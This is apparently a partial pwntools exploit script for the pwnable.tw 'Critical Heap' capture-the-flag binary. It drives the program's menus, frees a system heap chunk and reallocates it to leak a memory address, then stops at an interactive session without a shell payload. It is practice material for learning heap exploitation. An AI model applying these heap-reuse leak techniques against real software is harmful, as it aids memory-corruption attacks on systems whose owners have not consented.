#!/usr/bin/env python

from pwn import *

context.update(log_level='debug', arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])

p = process('./critical_heap')
#p = remote('chall.pwnable.tw', 10500)

Debug = True

if Debug:
    gdb.attach(p, '''
        continue
    ''')

'''
puts("*****************************");
puts("       Critical Heap++       ");
puts("*****************************");
puts(" 1.Create a new heap         ");
puts(" 2.Show a heap               ");
puts(" 3.Rename a heap             ");
puts(" 4.Play with a heap          ");
puts(" 5.Delete a heap             ");
puts(" 6.Exit                      ");
puts("*****************************");
'''

def create_heap(name, type, content = None):
    '''
    type : 1 normal, 2 clock, 3 system
    context: only need when type = 1
    '''
    p.sendlineafter('Your choice : ', '1')
    p.sendlineafter('Name of heap:', name)
    p.sendlineafter('Your choice : ', str(type))
    if type == 1:
        p.sendafter('Content of heap :', content)

def show_heap(index):
    p.sendlineafter('Your choice : ', '2')
    p.sendlineafter('Index of heap :', str(index))

def delete_heap(index):
    p.sendlineafter('Your choice : ', '5')
    p.sendlineafter('Index of heap :', str(index))


create_heap('system_heap', 3)

'''
puts("*******************************");
puts("          SYSTEM Heap          ");
puts("*******************************");
puts(" 1.Set the name for the heap   ");
puts(" 2.Unset the name in the heap  ");
puts(" 3.Get real path to the system  ");
puts(" 4.Get the value of name       ");
puts(" 5.Return                      ");
puts("*****************************");
'''
#play heap
p.sendlineafter('Your choice : ', '4')
p.sendlineafter('Index of heap :', '0')
# set
p.sendlineafter('Your choice : ', '1')
p.sendlineafter('Give me a name for the system heap :', 'XSEC')
p.sendlineafter('Give me a value for this name :', 'OVESEC')
# get
p.sendlineafter('Your choice : ', '4')
p.sendlineafter("What's name do you want to see :", 'XSEC')
# return
p.sendlineafter('Your choice : ', '5')

delete_heap(0)

create_heap('normal_heap', 1, 'A' * 8)

show_heap(0)
p.recvuntil('A' * 8)
leak_addr = u32(p.recv(4))
log.success('leak_addr = ' + hex(leak_addr))

p.recvuntil('Your choice : ')

p.interactive()
